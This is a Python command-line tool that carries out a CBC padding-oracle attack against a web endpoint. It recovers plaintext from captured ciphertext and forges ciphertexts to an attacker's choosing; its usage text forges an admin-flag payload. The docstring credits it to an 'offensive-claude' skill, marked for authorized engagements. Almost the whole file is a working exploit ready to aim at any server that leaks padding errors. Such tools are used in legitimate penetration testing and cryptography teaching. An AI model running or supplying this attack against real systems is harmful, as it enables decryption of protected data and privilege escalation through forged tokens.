#!/usr/bin/env python3
"""
padding_oracle.py - CBC padding-oracle decryption and forgery against an HTTP endpoint.

Exploits a server that distinguishes valid vs invalid PKCS#7 padding (CWE-209) to:
  - decrypt : recover plaintext of a captured ciphertext byte-by-byte
  - encrypt : forge a ciphertext that decrypts to an attacker-chosen plaintext

The oracle is configured by either an HTTP status code or a body substring that means
"bad padding". The ciphertext is sent in a URL/POST parameter (configurable) as the
attacker varies the preceding block.

Usage:
  python3 padding_oracle.py decrypt --url https://t/api/dec --param data \
      --ct BASE64_OR_HEX --block 16 --oracle-string 'PaddingException'
  python3 padding_oracle.py encrypt --url https://t/api/dec --param data \
      --plaintext '{"admin":true}' --block 16 --oracle-status 200

Complexity: ~256 * block_size * num_blocks oracle requests. VERY noisy (see OPSEC).
Dependencies: Python 3.8+, requests.  (pip install requests)
Author: offensive-claude / crypto-analysis skill. Authorized engagements only.
"""
import argparse
import base64
import sys

try:
    import requests
except ImportError:
    sys.exit("[-] pip install requests")


def decode_ct(s):
    try:
        return base64.b64decode(s)
    except Exception:
        return bytes.fromhex(s)


class Oracle:
    def __init__(self, url, param, method, oracle_string, oracle_status, ok_means_valid):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.oracle_string = oracle_string
        self.oracle_status = oracle_status
        self.ok_means_valid = ok_means_valid
        self.session = requests.Session()
        self.count = 0

    def valid_padding(self, ct: bytes) -> bool:
        """Return True iff the server reports VALID padding for this ciphertext."""
        self.count += 1
        payload = base64.b64encode(ct).decode()
        if self.method == "GET":
            r = self.session.get(self.url, params={self.param: payload}, timeout=15)
        else:
            r = self.session.post(self.url, data={self.param: payload}, timeout=15)
        if self.oracle_string is not None:
            bad = self.oracle_string in r.text
            return not bad
        if self.oracle_status is not None:
            # ok_means_valid: oracle_status indicates VALID padding
            return (r.status_code == self.oracle_status) == self.ok_means_valid
        # default: 4xx/5xx == bad padding
        return r.status_code < 400


def decrypt(oracle, ct, bs):
    blocks = [ct[i:i + bs] for i in range(0, len(ct), bs)]
    plaintext = b""
    for bi in range(len(blocks) - 1, 0, -1):
        target = blocks[bi]
        inter = bytearray(bs)  # intermediate state D_k(target)
        dec = bytearray(bs)
        for pos in range(bs - 1, -1, -1):
            pad = bs - pos
            prefix = bytearray(bs)
            for k in range(pos + 1, bs):
                prefix[k] = inter[k] ^ pad
            found = False
            for guess in range(256):
                prefix[pos] = guess
                if oracle.valid_padding(bytes(prefix) + target):
                    # guard against false positive on last byte (existing valid pad)
                    if pos == bs - 1:
                        prefix[pos - 1] ^= 0xFF
                        ok = oracle.valid_padding(bytes(prefix) + target)
                        prefix[pos - 1] ^= 0xFF
                        if not ok:
                            continue
                    inter[pos] = guess ^ pad
                    dec[pos] = inter[pos] ^ blocks[bi - 1][pos]
                    found = True
                    break
            if not found:
                sys.exit(f"[-] no valid byte at block {bi} pos {pos}")
        plaintext = bytes(dec) + plaintext
        sys.stderr.write(f"[*] block {bi} done ({oracle.count} reqs)\n")
    # strip PKCS#7
    if plaintext:
        padlen = plaintext[-1]
        if 1 <= padlen <= bs and plaintext[-padlen:] == bytes([padlen]) * padlen:
            plaintext = plaintext[:-padlen]
    return plaintext


def encrypt(oracle, plaintext, bs):
    """Forge ciphertext decrypting to plaintext. Builds blocks back-to-front."""
    # PKCS#7 pad
    padlen = bs - (len(plaintext) % bs)
    pt = plaintext + bytes([padlen]) * padlen
    pblocks = [pt[i:i + bs] for i in range(0, len(pt), bs)]

    # final ciphertext block is arbitrary; we choose zeros and derive preceding blocks
    c_next = bytearray(bs)  # last C block (random/zero)
    cipher = bytes(c_next)
    for pblock in reversed(pblocks):
        inter = bytearray(bs)
        forged_prev = bytearray(bs)
        for pos in range(bs - 1, -1, -1):
            pad = bs - pos
            for k in range(pos + 1, bs):
                forged_prev[k] = inter[k] ^ pad
            found = False
            for guess in range(256):
                forged_prev[pos] = guess
                if oracle.valid_padding(bytes(forged_prev) + bytes(c_next)):
                    if pos == bs - 1:
                        forged_prev[pos - 1] ^= 0xFF
                        ok = oracle.valid_padding(bytes(forged_prev) + bytes(c_next))
                        forged_prev[pos - 1] ^= 0xFF
                        if not ok:
                            continue
                    inter[pos] = guess ^ pad
                    found = True
                    break
            if not found:
                sys.exit(f"[-] forge failed at pos {pos}")
        # C_prev = inter XOR desired plaintext block
        c_prev = bytes(inter[i] ^ pblock[i] for i in range(bs))
        cipher = c_prev + cipher
        c_next = bytearray(c_prev)
    return cipher


def main():
    ap = argparse.ArgumentParser(description="CBC padding-oracle decrypt/encrypt")
    sub = ap.add_subparsers(dest="cmd", required=True)
    for name in ("decrypt", "encrypt"):
        p = sub.add_parser(name)
        p.add_argument("--url", required=True)
        p.add_argument("--param", default="data")
        p.add_argument("--method", default="POST")
        p.add_argument("--block", type=int, default=16)
        p.add_argument("--oracle-string", help="body substring meaning BAD padding")
        p.add_argument("--oracle-status", type=int, help="status code for the oracle")
        p.add_argument("--ok-means-valid", action="store_true",
                       help="treat --oracle-status as the VALID-padding code")
        if name == "decrypt":
            p.add_argument("--ct", required=True, help="base64 or hex ciphertext (incl IV)")
        else:
            p.add_argument("--plaintext", required=True)
    args = ap.parse_args()

    oracle = Oracle(args.url, args.param, args.method, args.oracle_string,
                    args.oracle_status, args.ok_means_valid)

    if args.cmd == "decrypt":
        ct = decode_ct(args.ct)
        pt = decrypt(oracle, ct, args.block)
        sys.stderr.write(f"[+] {oracle.count} oracle requests\n")
        print("[+] recovered plaintext:")
        sys.stdout.buffer.write(pt + b"\n")
    else:
        forged = encrypt(oracle, args.plaintext.encode(), args.block)
        sys.stderr.write(f"[+] {oracle.count} oracle requests\n")
        print("[+] forged ciphertext (base64):", base64.b64encode(forged).decode())


if __name__ == "__main__":
    main()
